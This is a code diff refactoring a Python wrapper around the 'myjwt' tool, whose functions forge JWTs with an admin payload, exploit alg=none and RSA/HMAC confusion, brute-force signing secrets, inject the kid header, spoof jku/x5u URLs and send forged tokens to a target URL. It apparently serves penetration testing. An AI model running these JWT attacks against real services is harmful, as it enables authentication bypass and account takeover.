@@ -1,64 +1,88 @@
 import subprocess
-
-def modify_your_JWT ( jwt ):
-     print(jwt)
-     new_jwt = subprocess.run(["myjwt", jwt, "--add-payload" , "username=admin", "--add-header", "refresh=false"])
-     print(new_jwt)
-     return new_jwt
+from typing import List
 
 
-def none_vulnerability ( jwt ):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--none""-vulnerability"])
-    print(new_jwt)
-    return new_jwt
+def _run_myjwt(args: List[str]) -> subprocess.CompletedProcess:
+    """
+    Internal helper to execute myjwt commands consistently.
+    """
+    return subprocess.run(
+        ["myjwt"] + args,
+        capture_output=True,
+        text=True,
+        check=False
+    )
 
-def sign_key ( jwt ,key):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--sign", key])
-    print(new_jwt)
-    return new_jwt
 
-def brute_force ( jwt ,path):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--bruteforce", path])
-    print(new_jwt)
-    return new_jwt
+def modify_jwt(jwt: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--add-payload", "username=admin",
+        "--add-header", "refresh=false"
+    ])
 
-def Crack ( jwt ,regex):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--regex", regex])
-    print(new_jwt)
-    return new_jwt
 
-def RSA_HMAC_confusion ( jwt ,file):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--hmac", file])
-    print(new_jwt)
-    return new_jwt
+def none_vulnerability(jwt: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--none-vulnerability"
+    ])
 
-def kid_injection ( jwt ):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--kid", "INJECTION"])
-    print(new_jwt)
-    return new_jwt
 
-def send_your_new_Jwt_to_url ( jwt ):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "-u", jwt, "-c", "jwt=", jwt,
-                              "--none""-vulnerability", "--add-payload" , "username=admin"])
-    print(new_jwt)
-    return new_jwt
+def sign_key(jwt: str, key: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--sign", key
+    ])
 
-def Jku_vulnerability ( jwt ,url):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--jku", url])
-    print(new_jwt)
-    return new_jwt
 
-def X5U_vulnerability ( jwt ,url):
-    print(jwt)
-    new_jwt = subprocess.run(["myjwt", jwt, "--x5u", url])
-    print(new_jwt)
-    return new_jwt
+def brute_force(jwt: str, path: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--bruteforce", path
+    ])
 
+
+def crack(jwt: str, regex: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--regex", regex
+    ])
+
+
+def rsa_hmac_confusion(jwt: str, key_file: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--hmac", key_file
+    ])
+
+
+def kid_injection(jwt: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--kid", "INJECTION"
+    ])
+
+
+def send_jwt_to_url(jwt: str, url: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "-u", url,
+        "-c", f"jwt={jwt}",
+        "--none-vulnerability",
+        "--add-payload", "username=admin"
+    ])
+
+
+def jku_vulnerability(jwt: str, url: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--jku", url
+    ])
+
+
+def x5u_vulnerability(jwt: str, url: str) -> subprocess.CompletedProcess:
+    return _run_myjwt([
+        jwt,
+        "--x5u", url
+    ])
